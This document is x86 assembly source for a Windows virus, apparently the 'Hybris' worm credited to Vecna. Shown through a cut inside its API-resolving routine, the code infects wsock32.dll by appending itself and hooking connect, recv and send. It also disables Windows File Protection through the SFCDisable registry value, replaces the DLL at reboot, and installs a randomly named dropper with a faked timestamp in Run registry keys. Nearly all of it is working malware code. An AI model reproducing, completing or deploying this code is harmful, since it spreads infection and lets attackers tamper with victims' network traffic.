;que los dioses nos perdonen por nuestra hybris

.586p
.model flat
locals
.data

ofs          equ offset
dwo          equ dword ptr
wo           equ word ptr
by           equ byte ptr

DEBUG        equ TRUE
;DEBUG        equ FALSE

WIN98        equ TRUE                   ;use kewl method of write WININIT.INI

SETUPAPI     equ TRUE                   ;try use SETUPAPI.DLL to update wsock
;SETUPAPI     equ FALSE

WININET      equ TRUE
RASAPI32     equ FALSE                   ;method to check active inet connection

WORKSPACE    equ 64*1024                ;worksize to infect wsock32

FILE_POS     equ 0200h                  ;offset of first section in dropper

IS_INFECTED  equ 0                      ;in-memory infection mark for wsock32

IF DEBUG EQ FALSE
SLEEP_APPZ   equ 1000*60*5              ;5 minutos -  time till muazzin appz
ELSE
SLEEP_APPZ   equ 1000*5
ENDIF

MUAZZIN_MAX    equ 64                     ;max size in kb of each muazzin

MAXDROPPERSIZE equ 64

_E_          equ 11h

CRC_POLY     equ 0EDB88320h
CRC_INIT     equ 000000000h


crc    macro string                     ;jp/lapse macro
.radix 16d
       crcReg = CRC_INIT
       irpc _x, <string>
         ctrlByte = '&_x&' xor (crcReg and 0ff)
         crcReg = crcReg shr 8
         rept 8
           ctrlByte = (ctrlByte shr 1) xor (CRC_POLY * (ctrlByte and 1))
         endm
         crcReg = crcReg xor ctrlByte
       endm
       dd crcReg
.radix 10d
endm


init   PROC
       push 0
       push esp
       push PAGE_EXECUTE_READWRITE
       push dwo [vsize]
       push ofs vstart
  extrn GetCurrentProcess:PROC
       call GetCurrentProcess
       push eax
  extrn VirtualProtectEx:PROC
       call VirtualProtectEx
       pop ecx

  extrn GetTickCount:PROC
       call GetTickCount
       mov [pseed], eax
       push 0
       call @@1
       db "Primeira gera‡Æo", 0
  @@1:
       call @@2
       db "Vocˆ liberou um virus no sistema.", 0
  @@2:
       push 0
  extrn MessageBoxA:PROC
       call MessageBoxA

       call @@3
       db "KERNEL32.DLL", 0
  @@3:
  extrn GetModuleHandleA:PROC
       call GetModuleHandleA
       call delta
       jmp _1st_gen
init   ENDP


.code

vstart equ this byte

.xlist
include \inc\win32api.inc
include \inc\useful.inc
include \inc\mz.inc
include \inc\pe.inc
include \inc\socket.inc
.list

main   PROC
       jmp @@nul
vsize  dd (vend-vstart)                 ;size in a var for easier expansion
vname  db "AAAA"
mname  db "AAAA", 0
generation db 1
minst  db MUAZZINS             ;number of muazzins currently installed
       db "HYBRIS",0
  @@nul:
       cld
       push 041104ch
rva_import equ $-4
       db 0ffh, 015h         ;direct call to GetModuleHandle in our import
       dd 00411000h          ;table... full w32 compatible

_1st_gen:
       mov [kernel32], eax
       add esp, -size_k32_api                  ;alloc temp memory for APIs
       mov ecx, esp
       push eax
       call @@apicrc

    kernel32_api equ this byte
IF WIN98 EQ FALSE
       crc <GetWindowsDirectoryA>
  GetWindowsDirectoryA equ esp+124
ENDIF
       crc <(c) Vecna>
  MARKER equ esp+120
       crc <DeleteFileA>
  DeleteFileA equ esp+116
       crc <CopyFileA>
  CopyFileA equ esp+112
       crc <UnmapViewOfFile>
  UnmapViewOfFile equ esp+108
       crc <GlobalAlloc>
  GlobalAlloc equ esp+104
       crc <GetModuleFileNameA>
  GetModuleFileNameA equ esp+100
       crc <DosDateTimeToFileTime>
  DosDateTimeToFileTime equ esp+96
       crc <MoveFileExA>
  MoveFileExA equ esp+92
       crc <WritePrivateProfileStringA>
  WritePrivateProfileStringA equ esp+88
       crc <FindClose>
  FindClose equ esp+84
       crc <WriteFile>
  WriteFile equ esp+80
       crc <ReadFile>
  ReadFile equ esp+76
       crc <SetEndOfFile>
  SetEndOfFile equ esp+72
       crc <GetSystemDirectoryA>
  GetSystemDirectoryA equ esp+68
       crc <FindFirstFileA>
  FindFirstFileA equ esp+64
       crc <IsBadWritePtr>
  IsBadWritePtr equ esp+60
       crc <VirtualAlloc>
  VirtualAlloc equ esp+56
       crc <SetFileTime>
  SetFileTime equ esp+52
       crc <SetFileAttributesA>
  SetFileAttributesA equ esp+48
       crc <SetFilePointer>
  SetFilePointer equ esp+44
       crc <GlobalFree>
  GlobalFree equ esp+40
       crc <FreeLibrary>
  FreeLibrary equ esp+36
       crc <LoadLibraryA>
  LoadLibraryA equ esp+32
       crc <CloseHandle>
  CloseHandle equ esp+28
       crc <CreateFileA>
  CreateFileA equ esp+24
       crc <CreateFileMappingA>
  CreateFileMappingA equ esp+20
       crc <MapViewOfFile>
  MapViewOfFile equ esp+16
       crc <GetProcAddress>
  GetProcAddress equ esp+12
       crc <GetModuleHandleA>
  GetModuleHandleA_ equ esp+8
       crc <WinExec>
  WinExec equ esp+4
       crc <ExitProcess>
  ExitProcess equ esp+0
    size_k32_api equ ($-kernel32_api)
  @@apicrc:
       push ecx
       push size_k32_api/4
       call GetAPI                             ;get kernel32 apis
       push 011b
       mov dwo [MARKER+4], CRC_POLY
       pop ebp
       xor dwo [hkey1], ebp
       xor dwo [hkey2], ebp
       mov ebp, [vsize]

       push PAGE_EXECUTE_READWRITE
       push MEM_COMMIT+MEM_RESERVE             ;MEM_TOPDOWN==w32s uncompatible
       push ebp
       push 0
       call [VirtualAlloc+(4*4)]
       test eax, eax                           ;exit if cant alloc mem
       jz @@error
       push eax
       push ebp
       push eax
       call [IsBadWritePtr+(3*4)]              ;check for write access to such mem
       add [esp], ebp
       pop edi
       test eax, eax
       lea esi, [ebp+ofs vstart]
       jnz @@error                             ;somethign wrong with alloc mem

       push "LL"
       push "D.23"
       push "_2SW"
       push esp
       call [LoadLibraryA+(4*4)]
       test eax, eax
       pop eax eax eax
       jz @@error                              ;wsock2 isnt installed...
       push eax
       call [FreeLibrary+(1*4)]

       std
       xchg ebp, ecx
       rep movsb                               ;move virus 2 alloc memory
       mov by [edi], 0ebh
       add edi, ($-ofs vstart)+8
       jmp edi                                 ;jmp 2 highmem

       cld                              ;now weïre in high mem, and all the
       call delta                       ;APIs we need for the nonres part are
       mov by [ebp+(ofs @@error2-ofs vstart)+5], 0ebh   ;no delete
       mov by [ebp+(ofs @@locked-ofs vstart)], 3ch      ;cmp al,
       mov dwo [ebp+(ofs tmpmemo-ofs vstart)], ecx

       pushad

       push 0
       push "LLD."
       push "23IP"
       push "AVDA"
       push esp
       call [LoadLibraryA+(1*4)+(4*4)+(8*4)]
       pop ecx ecx ecx ecx

       push CRC_POLY
     org $-4
       crc <RegOpenKeyExA>
       push CRC_POLY
     org $-4
       crc <RegSetValueExA>
       push CRC_POLY
     org $-4
       crc <RegCloseKey>

       mov ecx, esp
       sub esp, 12
       mov edx, esp

       push eax
       push ecx
       push edx
       push 3
       call GetAPI

       pop esi                                  ;ebx=RegSetValueExA
       pop ebx                                  ;esi=RegOpenKeyExA
       pop edi                                  ;edi=RegCloseKey
       call delta
       mov [ebp+(ofs RegCloseKey-ofs vstart)], edi
       mov [ebp+(ofs RegSetValueExA-ofs vstart)], ebx
       mov [ebp+(ofs RegOpenKeyExA-ofs vstart)], esi
       add esp, 12

       push eax
       push esp
       push 00020006h
       push 0
       call @@zkipkey
       db "Software\Microsoft\Windows NT\CurrentVersion\Winlogon",0
  @@zkipkey:
       push 80000002h                   ;HKEY_LOCAL_MACHINE
       call esi
       test eax, eax
       pop edx
       jnz @@errorw2k
       push edx
       push 0FFFFFF9Dh
       mov eax, esp
       push 4
       push eax
       push 4   ;REG_DWORD
       push 0
       call @@skipzzzz
       db "SFCDisable",0
  @@skipzzzz:
       push edx
       call ebx                 ;SetValue
       pop eax
       call edi                 ;Close
  @@errorw2k:
       popad

       sub esp, MAX_PATH                ;already found... lets rock
       mov esi, esp
       add esp, -SIZEOF_WIN32_FIND_DATA
  @@retry_name:
IF DEBUG EQ FALSE
       push MAX_PATH
       push esi
       call [GetSystemDirectoryA+(2*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
       test eax, eax
       jz @@error2
ELSE
       sub eax, eax
ENDIF
       lea edi, [esi+eax]
       mov eax, 'OSW\'
       stosd
       xor eax, '23KC' xor 'OSW\'
       stosd
       xor eax, 'LLD.' xor '23KC'              ;build DLL path
       stosd
       sub eax, eax
       stosd

  @@infect:
       push esp
       push esi
       call [FindFirstFileA+(2*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]    ;get full file info
       mov ebx, eax
       inc ebx
       jz @@error2

       sub ebp, ebp
       push eax
       call [FindClose+(1*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
       cmp [esp+WFD_nFileSizeHigh], ebp
       jne @@error2
       push 18
       mov eax, [esp+WFD_nFileSizeLow+4]
       sub edx, edx
       pop ecx
       div ecx
       cmp edx, 16                             ;if((fsize MOD 18)=16)
       je @@error1                             ;already infected

       push 80h
       push esi
       call [SetFileAttributesA+(2*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
       test eax, eax
       jz @@locked

       push ebp
       push FILE_ATTRIBUTE_NORMAL
       push OPEN_EXISTING
       push ebp
       push ebp                       ;NOSHARE
       push GENERIC_READ+GENERIC_WRITE
       push esi
       call [CreateFileA+(7*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
       mov ebx, eax
       inc eax
       jnz @@skipzz

  @@locked:
       jmp @@fucked666

       push MAX_PATH                           ;copy to other filename
       push 40h
       call [GlobalAlloc+(2*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
       test eax, eax
       jz @@fucked666
       call delta
       mov by [ebp+(ofs @@locked-ofs vstart)], 0ebh
       mov [ebp+(ofs tmpmemo-ofs vstart)], eax
       mov by [ebp+(ofs @@error2-ofs vstart)+5], 03ch           ;set2del
       xor edi, edi
       xchg edi, eax
       call strlen
       push edi
       push esi
       rep movsb
       sub edi, 3*4-1
       lea esi, [ebp+(ofs vname-ofs vstart)]
       movsd
       movsd
       stosd
       pop edi                  ;edi=oldname
       pop esi                  ;esi=new name
       push TRUE
       push esi
       push edi
       call [CopyFileA+(3*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
       test eax, eax
       jnz @@infect
       mov dwo [SIZEOF_WIN32_FIND_DATA+MAX_PATH+MARKER], IS_INFECTED
       mov by [ebp+(ofs @@error2-ofs vstart)+5], 0ebh
  @@fucked666:
       jmp @@error5

  @@skipzz:

       push ebx
       mov esi, [esp+4+WFD_nFileSizeLow]
       add esi, WORKSPACE
       push ebp
       push esi                         ;size
       push ebp
       push PAGE_READWRITE
       push ebp
       push ebx
       call [CreateFileMappingA+(6*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+4]
       test eax, eax
       jz @@error6
       push eax
       push esi
       push ebp
       push ebp
       push FILE_MAP_WRITE
       push eax
       call [MapViewOfFile+(5*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+8]   ;build map
       test eax, eax
       jz @@error7
       push eax
       push [esp+WFD_nFileSizeLow+12]
       push eax
       call [IsBadWritePtr+(2*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+12]
       test eax, eax
       mov eax, [esp]
       jnz @@error8
       pushad               ;(8*4)+(3*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH
       movzx ebx, wo [eax]
       add eax, [eax+3ch]

       push eax
       push 0f8h
       push eax
       call [IsBadWritePtr+(11*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+12]
       test eax, eax
       pop eax
       jnz @@notpe

       xor ebx, [eax]
       call delta
       xor ebx, "ZM" xor "EP"                  ;check if PE file
       mov ecx, [ebp+(ofs vsize-ofs vstart)]
       jne @@notpe
       test wo [eax.NT_FileHeader.FH_Characteristics], IMAGE_FILE_32BIT_MACHINE + IMAGE_FILE_DLL
       xor [eax.NT_FileHeader.FH_TimeDateStamp], eax   ;fux0r BIND ;)
       movzx ebx, wo [eax.NT_FileHeader.FH_NumberOfSections]
       jz @@notpe
       imul ebx, ebx, 40
       lea edx, [eax+ebx+(size IMAGE_NT_HEADERS)]
       mov edi, [edx.SH_PointerToRawData-40]
       mov ebp, [edx.SH_VirtualAddress-40]
       mov ebx, [edx.SH_SizeOfRawData-40]
       add [edx.SH_SizeOfRawData-40], ecx       ;increase last section
       add [edx.SH_VirtualSize-40], ecx
       mov [edx.SH_Characteristics-40], IMAGE_SCN_MEM_READ+IMAGE_SCN_MEM_WRITE+ \
                                        IMAGE_SCN_CNT_INITIALIZED_DATA
  @@realing:
       mov esi, [eax.NT_OptionalHeader.OH_SectionAlignment]
       dec esi
       add [edx.SH_VirtualSize-40], esi
       not esi
       and [edx.SH_VirtualSize-40], esi
       mov esi, [edx.SH_SizeOfRawData-40]
       cmp [edx.SH_VirtualSize-40], esi
       jnb @@fixit
       mov [edx.SH_VirtualSize-40], esi
       jmp @@realing
  @@fixit:
       push ecx
       mov ecx, [edx.SH_VirtualSize-40]
       add ecx, [edx.SH_VirtualAddress-40]
       mov [eax.NT_OptionalHeader.OH_SizeOfImage], ecx
       pop ecx
       add edi, ebx
       lea edx, [ebp+ebx]
       lea ebp, [edx+(ofs _DllMain-ofs vstart)]
       add edi, [esp.Pushad_eax]
       push edx
       push ebp
       call delta
       mov esi, ebp
       push ecx
       rep movsb                ;attach vcode
       pop ebp
       sub edi, ebp
       mov dwo [edi+(ofs sect_addy-ofs vstart)], edx
       sub esi, ebp
       pop ebp
       xchg ebp, [eax.NT_OptionalHeader.OH_AddressOfEntryPoint]
       mov [esi+(ofs @@base-ofs vstart)], edi
       mov [edi+(ofs olddllmain-ofs vstart)], ebp
       xchg eax, ebp
       mov eax, [esp+(8*4)+(4*4).WFD_nFileSizeLow]
       push 18
       add ecx, [ebp.NT_OptionalHeader.OH_FileAlignment]
       dec ecx
       add eax, ecx
       not ecx
       push ebp
       call delta
       add eax, [ebp+(ofs vsize-ofs vstart)]
       and eax, ecx
       sub edx, edx
       pop ebp
       pop ecx
       div ecx
       cdq
       inc eax
       inc eax
       mul ecx                                 ;mark as infected
       dec eax                                 ;fsize mod 18 == 16
       dec eax
       mov [esp+(8*4)+(4*4).WFD_nFileSizeLow], eax
       push dwo [esp+9*4]
       lea esi, [ebp.(size IMAGE_NT_HEADERS).SH_VirtualAddress]
       movzx ecx, wo [ebp.NT_FileHeader.FH_NumberOfSections]
       mov edi, [ebp.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
  @@find_r2r:
       mov ebx, edi
       lodsd
       push eax
       sub ebx, eax
       lodsd
       sub ebx, eax
       jc @@dc                  ;is section with export table?
       pop eax
       sub esi, -(IMAGE_SIZEOF_SECTION_HEADER-8)
       loop @@find_r2r         ;if this reach 0==shit (never will)
  @@dc:
       lodsd
       push eax
       call @@rva2raw
       xor [edi.ED_TimeDateStamp], edi
       mov edi, [edi.ED_AddressOfFunctions]
       call @@rva2raw
       pop esi
       pop esi
       xchg ecx, ebp
       call delta
       pop ebx
       pop esi
       push ebx
       push 3
       mov ebx, CRC_POLY
  @@base equ dwo $-4
       pop ebp

       lea eax, [esi.(ofs _connect-ofs vstart)]
       mov edx, eax
       xchg eax, [edi+ebp*4]    ;3
       sub ebp, -(15-3)
       sub eax, edx
       sub eax, (ofs oldconnect-ofs _connect)+4
       mov [ebx.(ofs oldconnect-ofs vstart)], eax

       lea eax, [esi.(ofs _recv-ofs vstart)]
       mov edx, eax
       xchg eax, [edi+ebp*4]    ;15
       inc ebp
       sub eax, edx
       sub eax, (ofs oldrecv-ofs _recv)+4
       mov [ebx.(ofs oldrecv-ofs vstart)], eax

       lea eax, [esi.(ofs _send-ofs vstart)]
       inc ebp
       mov edx, eax
       inc ebp
       xchg eax, [edi+ebp*4]    ;18
       sub eax, edx
       sub eax, (ofs oldsend-ofs _send)+4
       mov [ebx.(ofs oldsend-ofs vstart)], eax

       lea eax, [esi.((ofs olddllmain-ofs vstart)+4)]
       mov edx, [ebx.(ofs olddllmain-ofs vstart)]
       sub [ebx.(ofs olddllmain-ofs vstart)], eax
       test edx, edx
       jnz @@no_w2k
       mov [ebx.(ofs olddllmain-ofs vstart)], edx
  @@no_w2k:
       push 100h
       call rnd
       inc ah
       sub ebx, -((ofs host_key-ofs vstart))
       mov [ebx.(ofs host_size-ofs host_key)], eax
       xchg eax, esi            ;esi=size in bytes
       push edx             ;where start
       mov [ebx.(ofs host_rva-ofs host_key)], edx
       pop edi
       test edi, edi
       jnz @@no_w2k_2
       mov esi, edx
       mov dwo [ebx.(ofs host_size-ofs host_key)], esi
       jmp @@w2k

  @@no_w2k_2:
       add edi, [ecx.SIZE IMAGE_NT_HEADERS.SH_PointerToRawData]
       sub edi, [ecx.SIZE IMAGE_NT_HEADERS.SH_VirtualAddress]

       add edi, [esp]           ;now is time to encrypt part of the original
       mov eax, [edi]
       mov [ebx+(ofs orig4-ofs host_key)], eax

       push -1
       call rnd
       mov dwo [ebx], eax       ;code in the host DLL

  @@w2k:
       xchg esi, ecx
       jecxz @@zkipz
  @@encrypt:
       add by [edi], al               ;edi=place eax=key [host_size]
       scasb
       ror eax, 8
       loop @@encrypt            ;encrypt host dll code ;)
  @@zkipz:

       xchg esi, ecx
       pop ebx                          ;ebx==start of map
                                        ;ecx=pe header

       mov [ecx.NT_OptionalHeader.OH_CheckSum], esi     ;esi==0
       mov [((8*4)+(3*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+MARKER)], esi

       mov ebp, [esp+(8*4)+(3*4).WFD_nFileSizeLow]
       xchg esi, ebx
       push ebp
       xchg ecx, ebp
       shr ecx, 1
  @@crc:
       lodsw
       add dx, ax                       ;CheksumMappedFile-like code ;)
       adc dx, 0
       loop @@crc
       pop eax
       add eax, edx
       mov [ebp.NT_OptionalHeader.OH_CheckSum], eax

       call delta
       cmp by [ebp+(ofs @@locked-ofs vstart)], 3ch
       je @@notpe

  @@set2nodel:
       mov by [ebp+(ofs @@error2-ofs vstart)+5], 0ebh   ;no delete

  @@notpe:
       popad

  @@error8:
       call [UnmapViewOfFile+(1*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+8]

  @@error7:
       call [CloseHandle+(1*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+4];close map

       sub ebp, ebp
       push ebp
       push ebp
       push dwo [esp+WFD_nFileSizeLow+(3*4)]
       push dwo [esp+(3*4)]
       call [SetFilePointer+(4*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+4]

       push dwo [esp]
       call [SetEndOfFile+(1*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+4]  ;set correct file end

  @@error6:
       lea eax, dwo [esp+WFD_ftLastWriteTime+4]
       push eax
       sub eax, 8
       push eax
       sub eax, 8
       push eax
       push dwo [esp+(3*4)]
       call [SetFileTime+(4*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+4]

       call [CloseHandle+(1*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]

       call delta
       cmp by [ebp+(ofs @@error2-ofs vstart)+5], 0ebh
       jne @@error5

       lea esi, [esp+SIZEOF_WIN32_FIND_DATA]       ;esi=/winsys/wsock32.dll

       cmp dwo [ebp+(ofs tmpmemo-ofs vstart)],0
       je @@error5

IF SETUPAPI EQ TRUE
       pushad

       call @@zkipnamez
       db "SETUPAPI.DLL",0
  @@zkipnamez:
       call [LoadLibraryA+(8*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+4]
       mov ebx, eax
       test eax, eax
       jz @@apidontexists

       push ebx

       call @@zkipnamez2
       db "SetupInstallFileExA",0
  @@zkipnamez2:
       push ebx
       call [GetProcAddress+(8*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+12]
       sub ebx, ebx
       test eax, eax
       jz @@apidontexists2


       push ebx
       push esp
       push ebx
       push ebx
       push 441h                 ;sp_copy_source_absolute+sp_copy_deletesource
       push esi                  ;+sp_copy_noskip
       push ebx
       push dwo [ebp+(ofs tmpmemo-ofs vstart)]          ;oldname
       push ebx
       push ebx
       call eax
       mov ebx, eax
       pop eax
  @@apidontexists2:
       call [FreeLibrary+(8*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH+4]
  @@apidontexists:
       test ebx, ebx
       popad
       jnz @@error5
ENDIF


       pushad
       push 4+1                 ;MOVEFILE_DELAY_UNTIL_REBOOT
                                ;+MOVEFILE_REPLACE_EXISTING
       push esi   ;newname=wsock32.dll
       push dwo [ebp+(ofs tmpmemo-ofs vstart)]          ;oldname
       call [MoveFileExA+SIZEOF_WIN32_FIND_DATA+MAX_PATH+(3*4)+(4*8)]
       test eax, eax
       popad
       jnz @@error5

IF WIN98 EQ TRUE
       pushad

       push   "em"
       push "aneR"
       mov edi, esp
       push "LUN"
       mov ecx, esp
       push  "INI"
       push ".TIN"
       push "INIW"

       push esp
       push esi
       push ecx
       push edi
       call [WritePrivateProfileStringA+SIZEOF_WIN32_FIND_DATA+MAX_PATH+(10*4)+(4*8)]

       push esp         ;wininit.ini
       push dwo [ebp+(ofs tmpmemo-ofs vstart)]          ;oldname
       push esi         ;newname=wsock32.dll
       push edi         ;Rename
       call [WritePrivateProfileStringA+SIZEOF_WIN32_FIND_DATA+MAX_PATH+(10*4)+(4*8)]

       add esp, 6*4
       popad
ELSE
       pushad
       add esp, -MAX_PATH
       mov esi, esp
       push MAX_PATH
       push esi
       call [GetWindowsDirectoryA+SIZEOF_WIN32_FIND_DATA+MAX_PATH+(2*4)+MAX_PATH+8*4]
       lea edi, [esi+eax]
       mov eax, "NIW\"
       stosd
       mov eax, "TINI"
       stosd
       shl eax, 8
       add al, "."
       stosd
       sub eax, eax
       stosd
       push eax
       push FILE_ATTRIBUTE_NORMAL
       push CREATE_ALWAYS
       push eax
       push eax
       push GENERIC_READ+GENERIC_WRITE
       push esi
       call [CreateFileA+SIZEOF_WIN32_FIND_DATA+MAX_PATH+(7*4)+MAX_PATH+8*4]
       mov ebx, eax
       inc eax
       jz @@putamerda
       mov edi, [esp.Pushad_esi+MAX_PATH]
       xchg edi, esi
       mov edx, edi
       mov eax, "neR["                  ;[Rename]
       stosd
       mov eax, "]ema"
       stosd
       mov ax, 0a0dh
       stosw
       call strlen
       rep movsb
       mov al, "="
       stosb
       mov esi, [ebp+(ofs tmpmemo-ofs vstart)]
       call strlen
       rep movsb
       mov ax, 0a0dh
       stosw
       sub ecx, ecx
       sub edi, edx
       push esp
       push esp
       xchg ecx, [esp]
       push ecx
       push edi
       push edx
       push ebx
       call [WriteFile+SIZEOF_WIN32_FIND_DATA+MAX_PATH+(6*4)+MAX_PATH+8*4]
       mov [esp], ebx
       call [CloseHandle+SIZEOF_WIN32_FIND_DATA+MAX_PATH+(1*4)+MAX_PATH+8*4]
  @@putamerda:
       sub esp, -MAX_PATH
       popad
ENDIF

  @@error5:
       lea ebx, [esp+SIZEOF_WIN32_FIND_DATA]
       push dwo [esp+WFD_dwFileAttributes]
       push ebx
       call [SetFileAttributesA+(2*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
       jmp @@error2

  @@error1:
       mov dwo [SIZEOF_WIN32_FIND_DATA+MAX_PATH+MARKER], IS_INFECTED

  @@error2:
       push CRC_POLY
  tmpmemo equ dwo $-4
       jmp @@wasinfected
       push dwo [esp]
       call [DeleteFileA+(2*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]
  @@wasinfected:
       call [GlobalFree+(1*4)+SIZEOF_WIN32_FIND_DATA+MAX_PATH]

       add esp, SIZEOF_WIN32_FIND_DATA+MAX_PATH    ;return name bufer

  @@error:
       mov edi, MAX_PATH
       sub esp, edi
       mov ebx, esp
       sub esp, edi
       mov ebp, esp

       push edi
       push ebp
       push 0
       call [GetModuleFileNameA+(3*4)+(MAX_PATH*2)]

       push edi
       push ebx
       call [GetSystemDirectoryA+(2*4)+(MAX_PATH*2)]

       mov ecx, eax
       mov edx, ecx
       mov edi, ebx
       mov esi, ebp
  @@matchloop:
       lodsb
       cmp al, by [edi]
       je @@match
       xor al, 20h
       cmp by [edi], al
       jne @@nomatch
  @@match:
       inc edi
       loop @@matchloop
  @@nomatch:

       lea edi, [ebx+edx]
       mov al, "\"
       stosb
       mov eax, "AAAA"
  rnd_name1 equ dwo $-4
       stosd
       mov eax, "AAAA"
  rnd_name2 equ dwo $-4
       stosd
       mov eax, not "EXE."
       not eax
       stosd
       sub eax, eax
       stosd

       cmp dwo [MARKER+(MAX_PATH*2)], IS_INFECTED
       je @@errcopy1                  ;DLL was infect, so, no need set it
                                      ;it to autorun nor copy it to /winsys
       test ecx, ecx
       jz @@no_filecopy               ;DLL wasnt infected, but we already are
                                   ;in /winsys, so, only set to autorun again
       push OPEN_EXISTING
       push GENERIC_READ
       push ebp
       call @@open

       mov esi, eax
       inc eax
       jz @@errcopy

       push 128*1024
       push 40h
       call [GlobalAlloc+(2*4)+(MAX_PATH*2)]
       mov edi, eax

       push 0
       call delta
       sub ebp, -(ofs @@vsize1-ofs vstart)
       push ebp               ;where put result
       push 128*1024
       push edi
       push esi
       call [ReadFile+(5*4)+(MAX_PATH*2)]

       push esi
       call [CloseHandle+(1*4)+(MAX_PATH*2)]

       push CREATE_ALWAYS
       push GENERIC_WRITE
       push ebx
       call @@open

       mov ebp, eax
       inc eax
       jz @@bigfuck

       lea esi, [esp+(MAX_PATH-4)]

       push 0
       push esi
       push CRC_POLY
  @@vsize1 equ dwo $-4
       push edi
       push ebp
       call [WriteFile+(5*4)+(MAX_PATH*2)]

       push eax
       push eax                         ;tmp buffer

       push -1
       push -1
       call rnd
       movzx edx, ax
       call rnd
       movzx eax, ax
       and ah, 00001111b        ;0-7
       add ah, 15*2             ;1995
       push esp
       push edx
       push eax                         ;create rnd timestamp
       call [DosDateTimeToFileTime+(5*4)+(MAX_PATH*2)]

       mov eax, esp
       push eax
       push eax
       push eax                         ;set rnd timestamp
       push ebp
       call [SetFileTime+(6*4)+(MAX_PATH*2)]

       pop eax
       pop eax

       push ebp
       call [CloseHandle+(1*4)+(MAX_PATH*2)]

  @@bigfuck:
       push edi
       call [GlobalFree+(1*4)+(MAX_PATH*2)]

  @@no_filecopy:
       mov ebx, CRC_POLY                                ;ebx=RegSetValueExA
 RegSetValueExA equ $-4
       mov esi, CRC_POLY                                ;esi=RegOpenKeyExA
 RegOpenKeyExA equ $-4
       mov edi, CRC_POLY                                  ;edi=RegCloseKey
 RegCloseKey equ $-4

       push esp                  ;set for autorun, yeahh
       push esp
       push 00020006h
       push 0
       call delta
       sub ebp, -(ofs hkey-ofs vstart)
       push ebp
       push 80000002h                   ;HKEY_LOCAL_MACHINE
  hkey1 equ dwo $-4

       push esi
       mov esi, ebp
       push ((ofs hkey_e-ofs hkey)+3)/4
       pop ecx
  @@decrypt:
       xor [esi], CRC_POLY
       lodsd
       loop @@decrypt
       pop esi

       call esi                 ;Open
       pop edx
       test eax, eax
       jz @@noerrcopy

       push eax
       push esp
       push 00020006h
       push 0
       push ebp
       push 80000001h                   ;HKEY_CURRENT_USER
  hkey2 equ dwo $-4
       call esi
       test eax, eax
       pop edx
       jnz @@errcopy

  @@noerrcopy:
       push edx
       lea esi, [esp+MAX_PATH+4]
       push esi
       call strlen
       xchg [esp], ecx
       push ecx
       push 1
       push 0
       lea ecx, [ebp+(ofs minst-ofs hkey)+1]
       push ecx
       push edx
       call ebx                 ;SetValue

       call edi                 ;Close

       xor ecx, CRC_POLY

  @@errcopy1:
       test ecx, ecx            ;if DLL was infected, and it was in /winsys
       jnz @@errcopy            ;is time to delete it

       mov ebp, esp
       push 4                   ;MOVEFILE_DELAY_UNTIL_REBOOT
       push 0
       push ebp
       call [MoveFileExA+(MAX_PATH*2)+(3*4)]  ;NT delete
       test eax, eax
       jnz @@errcopy                    ;worked!

       push "LUN"
       mov ecx, esp                     ;ecx==esp
       push   "em"
       push "aneR"
       mov edx, esp
       push  "INI"
       push ".TIN"
       push "INIW"
       push esp         ;wininit.ini
       push ebp         ;\winsys\droppername
       push ecx         ;NUL
       push edx         ;Rename
       call [WritePrivateProfileStringA+(MAX_PATH*2)+(6*4)+(4*4)]
       add esp, 6*4

  @@errcopy:
       add esp, MAX_PATH*2

patch_ofs equ $-ofs vstart
       push dwo [esp]                          ;return 2 ExitProcess
       push dwo [esp]                          ;return stack bufer
       ret (size_k32_api)                      ;last API become paramz ;)

  @@open:
       sub eax, eax
       push eax
       push FILE_ATTRIBUTE_NORMAL
       push dwo [esp+12+(4*2)]
       push eax
       push FILE_SHARE_READ+FILE_SHARE_WRITE
       push dwo [esp+8+(4*5)]
       push dwo [esp+4+(4*6)]
       call [CreateFileA+(7*4)+(MAX_PATH*2)+(4*4)]
       ret 4*3

  @@rva2raw:
       add edi, dwo [esp+4]                   ;[esp]==rawoffset
       sub edi, dwo [esp+4+4]                 ;[esp+4]==virtualaddy
       add edi, dwo [esp+4+8]                 ;[esp+8]==mapbase
       ret
main   ENDP


hkey   dd "tfoS"  xor CRC_POLY
       dd "eraw"  xor CRC_POLY
       dd "ciM\"  xor CRC_POLY
       dd "osor"  xor CRC_POLY
       dd "W\tf"  xor CRC_POLY
       dd "odni"  xor CRC_POLY
       dd "C\sw"  xor CRC_POLY
       dd "erru"  xor CRC_POLY
       dd "eVtn"  xor CRC_POLY
       dd "oisr"  xor CRC_POLY
       dd "uR\n"  xor CRC_POLY
       dd "cnOn"  xor CRC_POLY
       dd "e"     xor CRC_POLY

       dd " )c("  xor CRC_POLY
       dd "nceV"  xor CRC_POLY                  ;(c) Vecna
       dd "a"     xor CRC_POLY
hkey_e equ this byte


include \muazzin\sign\xtea.asi


delta PROC
       call @@delta1
  @@delta1:
       pop ebp
       add ebp, -(ofs @@delta1-ofs vstart)
       ret
delta ENDP


include \muazzin\sign\key\keysize.asi
include \muazzin\sign\key\n.asi


;module address
;crc bufer
;api bufer
;number of api
GetAPI PROC
       mov edx, [esp+16]                       ;edx==kernel32
       mov esi, [edx+3ch]
       lea esi, [edx+esi+120]
       mov esi, [esi]
       lea esi, [esi+edx+24]
       lodsd
       push eax
       lodsd
       push eax
       lodsd
